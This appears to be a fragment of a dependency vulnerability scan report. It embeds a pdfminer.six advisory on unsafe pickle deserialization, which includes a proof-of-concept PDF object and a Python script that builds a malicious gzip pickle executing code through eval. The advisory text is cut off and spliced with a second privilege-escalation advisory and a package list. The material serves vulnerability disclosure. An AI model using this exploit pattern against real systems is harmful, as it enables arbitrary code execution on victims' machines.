The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.  ### Details  ```python # Vulnerable code in pdfminer/cmapdb.py:233-246 def _load_data(cls, name: str) -> Any:     name = name.replace(\"\\0\", \"\")  # Insufficient sanitization     filename = \"%s.pickle.gz\" % name     # ... path construction ...     path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored     # ...     return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization ```  An attacker can: 1. Create a malicious PDF with a CMap reference like `/malicious` 2. Place a malicious pickle file at `/malicious.pickle.gz` 3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle 4. The pickle deserialization can execute arbitrary Python code  ### POC  #### Malicious PDF  Create a PDF with a malicious CMAP entry:  ``` 5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj ```  Here the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.  #### Malicious Pickle  Create a malicious, zipped pickle to execute. For example, with this Python script:  ```python #!/usr/bin/env python3 import pickle import gzip  def create_demo_pickle():     print(\"Creating demonstration pickle file...\")      # Create payload that executes code AND returns a dict (as pdfminer expects)     class EvilPayload:         def __reduce__(self):             # This function will be called during unpickling             code = \"print('Malicious code executed.') or exit(0) or {}\"             return (eval, (code,))      demo_cmap_data = EvilPayload()      # Create the pickle file that the path traversal would access     target_path = \"./malicious.pickle.gz\"      try:         with gzip.open(target_path, 'wb') as f:             pickle.dump(demo_cmap_data, f)         print(f\"\u2713 Created demonstration pickle file: {target_path}\")         return target_path      except Exception as e:         print(f\"\u2717 Error creating pickle file: {e}\")         return None  if __name__ == \"__main__\":     create_demo_pickle() ```  This will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.  #### Test  Install pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:  ``` $ pdf2txt.py malicious.pdf Malicious code executed! ```  ### Impact  If pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.  The difficulty in achieving this depends on the OS, see below.  #### Linux, MacOS - harder to exploit  On Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:  * An attacker may find a way to write files to a known location on the target system or * The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.  Overall, there is generally less risk on a Linux or Linux-like system.  #### Windows - easier to exploit  Windows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.  ### Appendix  A complete, malicious PDF is provided here.

It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udea8 Special Note  This advisory addresses a distinct vulnerability from [GHSA-wf5f-4jwr-ppcp (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp).  While the previous CVE claims to mitigate issues related to unsafe deserialization, the patch introduced in commit [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086) does not address the vulnerability reported here.  Based on testing performed against the latest version of the library ([comparison view](https://github.com/pdfminer/pdfminer.six/compare/20250506...20251107)), the issue remains exploitable through local privilege escalation due to continued unsafe use of pickle files. The **Dockerfile** is hence modified to run test against this claim.  This demonstrates that the patch for **CVE-2025-64512** is incomplete: the vulnerability remains exploitable. This advisory therefore documents a distinct, independently fixable flaw. A correct remediation must remove the dependency on pickle files (or otherwise eliminate unsafe deserialization) and replace it with a safe, auditable data-handling approach so the library can operate normally without relying on ```pickle```  ## \ud83d\udcda Table of Contents  - [\ud83d\udd0d Background](#-background) - [\ud83d\udc0d Vulnerability Description](#-vulnerability-description) - [\ud83c\udfad Demo Scenario](#-demo-scenario) - [\ud83e\udde8 Technical Details](#-technical-details) - [\ud83d\udd27 Setup and Usage](#-setup-and-usage) - [\ud83d\udcdd Step-by-step Walkthrough](#-step-by-step-walkthrough) - [\ud83d\udee1\ufe0f Security Standards & References](#-security-standards--references) ---  ## \ud83d\udd0d Background  **pdfminer.six** is a popular Python library for extracting text and information from PDF files.

The attacker now has proof of code execution as root (and, in a real attack, could escalate further).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udee1\ufe0f Security Standards & References  - **CVSS (Common Vulnerability Scoring System):**   - **Base Score:** 7.8 (High)   - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  - **OWASP Top 10:**   - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)   - [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)  - **MITRE CWE References:**   - [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)   - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)  - **MITRE ATT&CK Techniques:**   - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)   - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)"}]}, {"name": "anyio", "version": "4.12.1", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "jiter", "version": "0.13.0", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "triton", "version": "2.3.1", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "urllib3", "version": "2.6.3", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "click", "version": "8.3.1", "vulns": []}, {"name": "greenlet", "version": "3.3.1", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "pypdfium2", "version": "5.3.0", "vulns": []}, {"name": "tqdm", "version": "4.67.3", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "brotli", "version": "1.2.0", "vulns": []}, {"name": "filelock", "version": "3.20.3", "vulns": []}, {"name": "more-itertools", "version": "10.8.0", "vulns": []}, {"name": "numba", "version": "0.63.1", "vulns": []}, {"name": "llvmlite", "version": "0.46.0", "vulns": []}, {"name": "numpy", "version": "2.3.5", "vulns": []}, {"name": "pycparser", "version": "3.0", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "tiktoken", "version": "0.12.0", "vulns": []}, {"name": "regex", "version": "2026.1.15", "vulns": []}, {"name": "torch", "version": "2.3.1", "vulns": [{"id": "PYSEC-2025-41", "fix_versions": ["2.6.0"], "aliases": ["BIT-pytorch-2025-32434", "GHSA-53q9-r3pm-6pq6", "CVE-2025-32434"], "description": "PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system.
